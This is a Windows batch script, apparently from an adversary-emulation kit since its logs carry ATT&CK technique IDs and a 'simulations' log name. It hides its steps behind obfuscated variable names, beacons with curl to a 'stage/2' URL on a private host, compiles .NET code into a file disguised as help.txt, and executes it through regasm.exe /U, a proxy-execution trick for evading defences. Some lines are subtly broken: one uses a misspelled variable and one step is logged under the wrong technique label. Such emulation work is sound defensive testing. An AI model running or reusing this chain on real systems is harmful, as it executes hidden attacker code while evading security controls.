@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8683\0d9b934c
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8683-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=help.txt
SET njozco=file.txt
SET kkjwr=8683
SET rkepmt=%APPDATA%\%ufeybybm%\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][%lqyereup%]: heartbeat_start>> "%rkepmt%" 2>nul
curl -k -s -o nul "%uouoq%"
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: heartbeat_complete>> "%rkepmt%" 2>nul

SET gjovj=1
SET rocrptl=
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: chdir_start>> "%rkepmt%" 2>nul
cd /d "%recnn%" 2>nul
if errorlevel 1 (SET gjovj=0&SET rocrptl=access_denied)
echo [%DATE% %TIME%][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile .NET Code=!gjovj!:!rocprtl!>> "%rkepmt%" 2>nul

SET fjskp=1
SET hsybhxn=
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: compile_start>> "%rkepmt%" 2>nul
vbc.exe /target:library /out:"%hpnjatpj%" "%njozco%" 2>nul
if errorlevel 1 (SET fjskp=0&SET hsybhxn=compilation_failed)
echo [%DATE% %TIME%][%lqyereup%]: %ufeybybm%-%kkjwr%-T1500|Compile .NET Code=%fjskp%:%hsybhxn%>> "%rkepmt%" 2>nul

SET ycbdu=1
SET wuqnvpx=
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: regasm_execute_start>> "%rkepmt%" 2>nul
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U "%hpnjatpj%" 2>nul
if errorlevel 1 (SET ycbdu=0&SET wuqnvpx=execution_failed)
echo [%DATE% %TIME%][%lqyereup%]: %ufeybybm%-%kkjwr%-T1218|Regasm=!ycbdu!:!wuqnvpx!>> "%rkepmt%" 2>nul
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: regasm_execute_complete>> "%rkepmt%" 2>nul